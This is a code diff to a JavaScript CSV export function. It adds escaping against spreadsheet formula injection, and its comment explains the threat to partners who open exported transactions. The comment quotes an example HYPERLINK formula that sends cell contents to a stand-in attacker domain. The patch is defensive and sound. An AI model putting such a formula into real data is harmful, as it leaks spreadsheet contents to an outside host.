@@ -86,7 +86,17 @@ export function toCsv(rows) {
   if (!rows.length) return "";
   const headers = Object.keys(rows[0]);
   const esc = (v) => {
-    const s = v == null ? "" : String(v);
+    let s = v == null ? "" : String(v);
+    // Neutralise spreadsheet formula injection.
+    //
+    // A CSV cell beginning `=`, `+`, `-`, `@`, tab or CR is evaluated as a formula
+    // by Excel and LibreOffice. The `company` column is an organisation name, which
+    // any fleet admin controls, so `=HYPERLINK("http://evil.tld/?d="&A1,"click")`
+    // in a company name would execute in the session of every partner who exported
+    // their transactions and opened the file. Prefixing with an apostrophe keeps the
+    // text visible and stops the evaluation. Commas, quotes and newlines were already
+    // handled; this was the gap.
+    if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
     return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
   };
   return [headers.join(","), ...rows.map((r) => headers.map((h) => esc(r[h])).join(","))].join("\n");
